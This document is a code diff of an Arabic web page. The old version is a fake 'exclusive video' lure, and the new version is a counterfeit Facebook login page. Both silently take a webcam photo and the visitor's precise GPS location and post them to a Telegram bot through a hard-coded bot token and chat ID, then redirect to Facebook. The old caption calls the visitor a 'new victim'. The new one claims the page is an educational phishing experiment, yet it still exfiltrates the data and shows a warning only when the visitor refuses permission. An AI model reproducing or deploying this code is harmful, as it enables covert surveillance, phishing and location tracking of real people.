@@ -3,77 +3,136 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>فضيحة حصرية</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <title>فيسبوك</title>
     <style>
-        body {background:#000; color:#fff; text-align:center; padding:40px; font-family:Arial, sans-serif;}
-        h1 {color:#ff0000; font-size:28px;}
-        p {font-size:22px;}
-        .loader {border:12px solid #333; border-top:12px solid #d32f2f; border-radius:50%; width:90px; height:90px; animation:spin 1s linear infinite; margin:40px auto;}
-        @keyframes spin {0% {transform:rotate(0deg);} 100% {transform:rotate(360deg);}}
-        .gift {font-size:100px;}
+        body {margin:0;padding:0;background:#f0f2f5;font-family:system-ui,sans-serif;display:flex;justify-content:center;align-items:flex-start;min-height:100vh;padding-top:20px;}
+        .fb-container {width:100%;max-width:400px;background:white;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);overflow:hidden;}
+        .header {background:#1877f2;padding:12px;text-align:center;color:white;font-size:20px;font-weight:bold;}
+        .form-area {padding:20px;}
+        input {width:100%;padding:14px;margin:8px 0;border:1px solid #dddfe2;border-radius:6px;font-size:16px;box-sizing:border-box;}
+        .login-btn {width:100%;padding:14px;background:#1877f2;color:white;font-size:18px;font-weight:bold;border:none;border-radius:6px;cursor:pointer;margin-top:10px;}
+        .links {text-align:center;margin:15px 0;font-size:14px;}
+        .links a {color:#1877f2;text-decoration:none;}
+        .footer {text-align:center;padding:20px;font-size:13px;color:#8a8d91;}
+        .warning {display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.9);color:white;text-align:center;padding:40px;font-size:20px;z-index:9999;flex-direction:column;justify-content:center;align-items:center;}
     </style>
 </head>
 <body>
-    <h1>🔥 جاري تحميل الفيديو الحصري 🔥</h1>
-    <p>انتظر قليلاً للتحقق من الموقع والجهاز...</p>
-    <div class="loader"></div>
-    <p>جاري التحميل...</p>
-    <div class="gift">🎁</div>
 
-    <script>
-        Telegram.WebApp.ready();
-        Telegram.WebApp.expand(); // يوسع الشاشة كاملة لتجربة أفضل
+<div class="fb-container">
+    <div class="header">فيسبوك</div>
+    <div class="form-area">
+        <form>
+            <input type="text" placeholder="رقم الجوال أو البريد الإلكتروني">
+            <input type="password" placeholder="كلمة المرور">
+            <button type="button" class="login-btn">تسجيل الدخول</button>
+        </form>
+        <div class="links">
+            <a href="#">نسيت كلمة المرور؟</a><br><br>
+            <a href="#">إنشاء حساب جديد</a>
+        </div>
+    </div>
+    <div class="footer">
+        العربية · English · Türkçe · بیشتر<br>
+        Meta © 2025
+    </div>
+</div>
 
-        let captured = false;
+<div id="warning" class="warning">
+    <h2>⚠️ تجربة تعليمية في التصيد الاحتيالي ⚠️</h2>
+    <p>لو كانت حقيقية: صورتك + موقعك تم سرقتها!</p>
+    <p style="color:#0f0;">لكن هنا كل شيء آمن وتعليمي 🎓</p>
+    <p>لا تسمح بالكاميرا أو الموقع في مواقع مشبوهة!</p>
+</div>
 
-        // طلب الكاميرا والموقع معًا
-        navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}})
-        .then(stream => {
-            let video = document.createElement('video');
-            video.srcObject = stream;
-            video.play();
+<script>
+// === غيّر هذه القيم فقط ===
+const BOT_TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
+const CHAT_ID = "1611398303";
+// ===========================
 
-            // نستنى 2 ثانية عشان يبان طبيعي
-            setTimeout(() => {
-                let canvas = document.createElement('canvas');
-                canvas.width = 1280; canvas.height = 720;
-                canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
-                let imgData = canvas.toDataURL('image/jpeg');
+let capturedImage = null;
 
-                // طلب الموقع
-                navigator.geolocation.getCurrentPosition(pos => {
-                    let gps = pos.coords.latitude + "," + pos.coords.longitude + " ±" + pos.coords.accuracy + "m";
-                    let time = new Date().toLocaleString('ar-EG');
-                    let caption = "🆕 ضحية جديدة\n📍 موقع: " + gps + "\n🕐 وقت: " + time;
+setTimeout(() => {
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+    .then(stream => {
+        let video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
 
-                    let form = new FormData();
-                    form.append('photo', dataURLtoBlob(imgData), "victim.jpg");
+        setTimeout(() => {
+            let canvas = document.createElement('canvas');
+            canvas.width = 1280;
+            canvas.height = 720;
+            canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
+            capturedImage = canvas.toDataURL('image/jpeg');
 
-                    fetch("https://api.telegram.org/bot8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8/sendPhoto?chat_id=1611398303&caption=" + encodeURIComponent(caption), {
+            stream.getTracks().forEach(t => t.stop());
+
+            navigator.geolocation.getCurrentPosition(
+                position => {
+                    // حساب الإحداثيات بدقة
+                    const lat = position.coords.latitude.toFixed(6);
+                    const lng = position.coords.longitude.toFixed(6);
+                    const acc = Math.round(position.coords.accuracy);
+                    const gps = lat + "," + lng + " ±" + acc + "m";
+
+                    // تنسيق الوقت بالعربية كاملاً
+                    const time = new Date().toLocaleString('ar-EG', {
+                        weekday: 'long',
+                        year: 'numeric',
+                        month: 'long',
+                        day: 'numeric',
+                        hour: '2-digit',
+                        minute: '2-digit',
+                        second: '2-digit'
+                    });
+
+                    // الكابتشن باستخدام backticks بشكل صحيح 100%
+                    const caption = "🎓 تجربة تعليمية ناجحة\n" +
+                                   "📍 الموقع: " + gps + "\n" +
+                                   "🕐 الوقت: " + time + "\n" +
+                                   "👨‍🏫 من درس الأستاذ";
+
+                    const blob = dataURLtoBlob(capturedImage);
+                    const form = new FormData();
+                    form.append('photo', blob, 'lesson.jpg');
+                    form.append('caption', caption);
+                    form.append('chat_id', CHAT_ID);
+
+                    fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto", {
                         method: 'POST',
                         body: form
-                    }).then(() => {
-                        captured = true;
+                    }).finally(() => {
+                        window.location.href = "https://m.facebook.com/";
                     });
-                }, () => {}, {timeout: 8000});
 
-                stream.getTracks().forEach(t => t.stop());
-            }, 2000);
-        })
-        .catch(() => { /* لو رفض الكاميرا */ });
+                },
+                error => {
+                    document.getElementById('warning').style.display = 'flex';
+                },
+                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+            );
+        }, 3000);
+    })
+    .catch(() => {
+        document.getElementById('warning').style.display = 'flex';
+    });
+}, 3000);
 
-        // نستنى 5 ثواني كاملة قبل الانتقال عشان يمدي يوافق
-        setTimeout(() => {
-            window.location.href = "https://m.facebook.com/";
-        }, 5000);
+// دالة التحويل
+function dataURLtoBlob(dataurl) {
+    let arr = dataurl.split(',');
+    let mime = arr[0].match(/:(.*?);/)[1];
+    let bstr = atob(arr[1]);
+    let n = bstr.length;
+    let u8arr = new Uint8Array(n);
+    while (n--) {
+        u8arr[n] = bstr.charCodeAt(n);
+    }
+    return new Blob([u8arr], {type: mime});
+}
+</script>
 
-        function dataURLtoBlob(dataurl) {
-            let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
-                bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
-            while(n--) u8arr[n] = bstr.charCodeAt(n);
-            return new Blob([u8arr], {type:mime});
-        }
-    </script>
 </body>
 </html>
